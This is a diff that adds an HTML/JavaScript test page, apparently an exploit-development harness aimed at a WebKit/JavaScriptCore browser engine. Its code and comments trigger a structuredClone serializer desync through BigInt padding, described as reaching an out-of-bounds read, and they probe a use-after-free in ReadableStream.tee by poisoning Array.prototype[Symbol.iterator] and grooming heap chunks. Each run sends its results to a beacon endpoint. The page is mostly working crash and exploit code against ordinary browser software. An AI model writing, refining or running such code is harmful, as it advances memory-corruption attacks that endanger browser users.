@@ -1,0 +1,151 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>FA-v11-KIMIB1 — T1/T5 non-crash oracles + B1 family-(b) BigInt-pad gate + X1 classifier</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])!==-1&&location.href.indexOf(u)===-1||u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v11-KIMIB1 — leg KIMI-MAX-B1. Query: ?b=0|1|2 (B1 variant, ONE run each) ?x=1..6 (X1 design, ONE run each; 0/absent = skip)
+</pre><script src="runtime-derive/derive-runtime.js"></script><script>
+(function(){
+ "use strict";
+ // ---------------------------------------------------------------------------
+ // FA-v11-KIMIB1 — design rules (leg KIMI-MAX-B1, 2026-10-15)
+ //  * ES5 syntax, no babel; APIs used: Symbol.iterator, BigInt(), structuredClone (all live on 14.20).
+ //  * ONE risky variant per RUN: ?b selects B1 variant, ?x selects X1 design; default = safe battery only.
+ //  * Beacon = SYNC XHR (ordering is causal; async fetch reorders -> FA-v3 lesson). Run-id < 32 B.
+ //  * X1: EVERY beacon/alloc happens before the seed; between seed and trigger there is NO statement that
+ //    can allocate class-128 (no beacon, no string, no JSON) -> the only class-128 alloc is the trigger's
+ //    converter `results` buffer, so LIFO reuse of the seed buffer is measurable (FA-v8 lesson: the beacon
+ //    XHR itself recycled the chunk and turned the zombie into SEGV).
+ //  * B1: heap-BigInt pads grow the READER's m_gcBuffer but NOT the writer's m_objectPool (BigInt is a
+ //    JSCell, not a JSObject -> dumpHeapBigIntData never calls recordObject). Duplicated object X emits
+ //    ObjectReferenceTag with writer width by m_objectPool.size(), read width by m_gcBuffer.size().
+ //    b=0: 1 pad  -> in-bounds wrong value (bigint) = SAFE logical desync detector.
+ //    b=1: 255 pads -> reader crosses 0xFF -> 2-byte read -> 0xFF01 >= size -> undefined + ValidationError.
+ //    b=2: 65540 pads -> reader crosses 0xFFFF -> 4-byte read over the array terminator -> 0xFFFFFF01 ->
+ //         at(-255) -> slotFor(-255) = m_buffer[-255] OOB pre-buffer read (CRASH-ORACLE, run last).
+ // ---------------------------------------------------------------------------
+ var Q = String(location.search || "");
+ function qn(n, d){ var m = Q.match(new RegExp("[?&]" + n + "=([0-9]+)")); return m ? (parseInt(m[1], 10) || 0) : d; }
+ var BV = qn("b", 0), XD = qn("x", 0);
+ var run = "v11" + Date.now().toString(36).slice(-16);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n" + s)); }
+ function b(st, body){
+   try{ var x = new XMLHttpRequest(); x.open("POST", "/beacon/V11-" + st, false);
+     x.setRequestHeader("Content-Type", "application/json");
+     x.send(JSON.stringify({ r: run, b: String(body).slice(0, 150) })); }catch(e){}
+ }
+ var origIter = Array.prototype[Symbol.iterator];
+ function underYield(){ return function(){ var a = this, i = 0, n = (a.length >= 2) ? 1 : a.length;
+   return { next: function(){ if (i >= n) return { done: true }; i++; return { value: { fake: 0 }, done: false }; } }; }; }
+ function plainTwice(){ var X = { ourTag: "v11" }; window.__tgt = X;
+   return function(){ var i = 0; return { next: function(){ if (i >= 2) return { done: true }; i++; return { value: X, done: false }; } }; }; }
+ function withPoison(p, fn){
+   var r;
+   try{ Array.prototype[Symbol.iterator] = p(); }catch(e){ Array.prototype[Symbol.iterator] = origIter; }
+   try{ r = fn(); } finally { try{ Array.prototype[Symbol.iterator] = origIter; }catch(e2){} }
+   return r;
+ }
+ // pre-created poison (safe to call between seed and trigger: property write + no class-128 alloc)
+ function withPoisonPre(pf, fn){
+   var r;
+   try{ Array.prototype[Symbol.iterator] = pf; }catch(e){ Array.prototype[Symbol.iterator] = origIter; }
+   try{ r = fn(); } finally { try{ Array.prototype[Symbol.iterator] = origIter; }catch(e2){} }
+   return r;
+ }
+ function ord(id, label, poison, work){
+   try{ b(id + "A", label); say("V11-" + id + " " + label);
+     var r = withPoison(poison, work);
+     b(id + "B", "SURV " + String(r).slice(0, 160));
+   }catch(e){ b(id + "E", "ETYPE: " + String(e).slice(0, 160)); }
+ }
+ // ---- stage L: load / params -------------------------------------------------
+ try{ b("L", "loaded dr=" + (typeof window.deriveRuntime) + " b=" + BV + " x=" + XD + " ua=" + navigator.userAgent.slice(0, 40)); say("V11 loaded"); }catch(e){}
+ // ---- stage C0: clean tee control -------------------------------------------
+ ord("C0", "clean tee control", plainTwice, function(){
+   var rs = new ReadableStream({}), p = rs.tee();
+   return "len=" + p.length + "; locked=" + p[0].locked; });
+ // ---- stage T1: state-write witness (cancel flip on same X) ------------------
+ ord("T1", "T1 state-write witness (pidInverted)", plainTwice, function(){
+   var rs = new ReadableStream({}), p = rs.tee(), f = false, s = false;
+   try{ p[0].cancel(); }catch(e){ f = true; } try{ p[1].cancel(); }catch(e){ s = true; }
+   return "pidInverted=" + (f && !s) + "; locked=" + p[0].locked; });
+ // ---- stage T5: shared-state double-wrap (cross-wrapper flip) ----------------
+ ord("T5", "T5 shared-state double-wrap", plainTwice, function(){
+   var rs1 = new ReadableStream({}), p1 = rs1.tee();
+   var rs2 = new ReadableStream({}), p2 = rs2.tee();
+   try{ p1[0].cancel(); }catch(e){}
+   return "p1=" + p1[0].locked + "; p2=" + p2[0].locked; });
+ // ---- stage B1: family-(b) gate (ONE variant per run) ------------------------
+ (function(){
+   var X = { kimib1: "X" };
+   var BIG = BigInt("0x10000000000000000");           // 2-digit heap BigInt under BIGINT32 on/off
+   if (BV === 0) {
+     b("B1A", "b0 1pad logical-desync probe");
+     var ctrl = null, sig = "n/a";
+     try{ var c1 = structuredClone([X, X]); ctrl = (c1[0] === c1[1] && c1[0] === X); }catch(e){ ctrl = "E:" + e.name; }
+     try{
+       var c2 = structuredClone([BIG, X, X]); var last = c2[2];
+       sig = (last === X) ? "IDENTITY" : ("WRONG-VALUE:" + (typeof last));
+     }catch(e){ sig = "THREW:" + e.name; }
+     b("B1B", "ctrl-identity=" + ctrl + "; pad1=" + sig);
+     say("B1-b0 " + sig);
+   } else if (BV === 1) {
+     b("B1A", "b1 255-pad 0xFF boundary probe");
+     var pads = [], i;
+     for (i = 0; i < 255; i++) pads.push(BIG + BigInt(i));
+     var arr = pads.concat([X, X]); pads = null;
+     try{
+       var c3 = structuredClone(arr);
+       b("B1B", "RET len=" + c3.length + " last=" + (typeof c3[c3.length - 1]));
+     }catch(e){ b("B1E", "THREW " + e.name + ": " + String(e.message).slice(0, 80)); }
+     say("B1-b1 done");
+   } else {
+     b("B1A", "b2 65540-pad 0xFFFF boundary CRASH-ORACLE (single shot)");
+     var p2 = [], j;
+     for (j = 0; j < 65540; j++) p2.push(BIG + BigInt(j));
+     var arr2 = p2.concat([X, X]); p2 = null;
+     try{
+       var c4 = structuredClone(arr2);
+       b("B1B", "RET len=" + c4.length + " last=" + (typeof c4[c4.length - 1]));
+     }catch(e){ b("B1E", "THREW " + e.name + ": " + String(e.message).slice(0, 80)); }
+     say("B1-b2 done");
+   }
+ })();
+ // ---- stage X1: classifier, ONE design per run -------------------------------
+ // seed = clean tee (allocates 128 B Vector<Strong> results, then frees it with slot[0]/[1] NULLED by
+ // ~Strong). trigger = tee under an iterator poison that yields 1 object -> binder reads results[1] raw.
+ // outcome grammar: X1B present = survived (slot[1]==0 -> "zombie" => getReader throws E:null-ish; or
+ // garbage => SEGV before beacon). missing X1B + HB-gap>4 s = crash-class. No beacon/alloc between seed
+ // and trigger. NOTE (tree fact, HandleTypes.h:32-36): results[1] holds a *HandleSlot pointer*, and
+ // getFromSlot derefs it (*slot). A recycled chunk is only a zombie if its qword 8 is 0; a JSValue in a
+ // recycled butterfly is NOT a HandleSlot (double indirection) -> cell-plant designs cannot wrap by
+ // themselves; they measure the nonzero-garbage branch.
+ if (XD >= 1 && XD <= 6) (function(){
+   var d = XD, tgt = { pl: "planted" }, gr = "n/a";
+   var pf = underYield();               // closure allocated BEFORE the seed (not between seed/trigger)
+   var seed = function(){ var rs = new ReadableStream({}), p = rs.tee(); return p[0].locked; };
+   var trig = function(){
+     return withPoisonPre(pf, function(){
+       var rs2 = new ReadableStream({}), p2 = rs2.tee();
+       var g;
+       try{ g = typeof p2[1].getReader(); }catch(e){ g = "E:" + String(e.message).slice(0, 40); }
+       return "len=" + p2.length + "; p2locked=" + p2[0].locked + "; gr2=" + g;
+     });
+   };
+   b("X1A", "x" + d + " seed->trigger" + (d === 2 ? " small-up" : d === 3 ? " flood-raw" : d === 4 ? " plant-cell" : d === 5 ? " ping-pong" : d === 6 ? " NO-SEED(reverse)" : " immediate"));
+   var r, i, k, q;
+   if (d === 1) { var s1 = seed(); r = trig(); }
+   else if (d === 2) { seed(); var sink = []; for (i = 0; i < 100; i++) sink.push({ n: i }); r = trig(); }
+   else if (d === 3) { seed(); var flood = []; for (k = 0; k < 8; k++) flood.push([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]); r = trig(); }
+   else if (d === 4) { seed(); q = [tgt, 1,2,3,4,5,6,7,8,9,10,11,12,13,14]; r = trig(); }
+   else if (d === 5) { seed(); trig(); seed(); r = trig(); }
+   else { r = trig(); }
+   b("X1B", "x" + d + " " + String(r).slice(0, 140));
+   say("X1-x" + d + " " + r);
+ })();
+ // ---- stage TGT: seal readback ----------------------------------------------
+ ord("TGT", "target seal readback", plainTwice, function(){
+   var t = window.__tgt;
+   return "tgt-keys=" + Object.keys(t || {}).join(",") + "; locked=" + (new ReadableStream({})).tee()[0].locked; });
+ b("Z", "FA-v11-KIMIB1 complete b=" + BV + " x=" + XD);
+ say("FA-v11-KIMIB1 complete");
+})();
+</script></body></html>
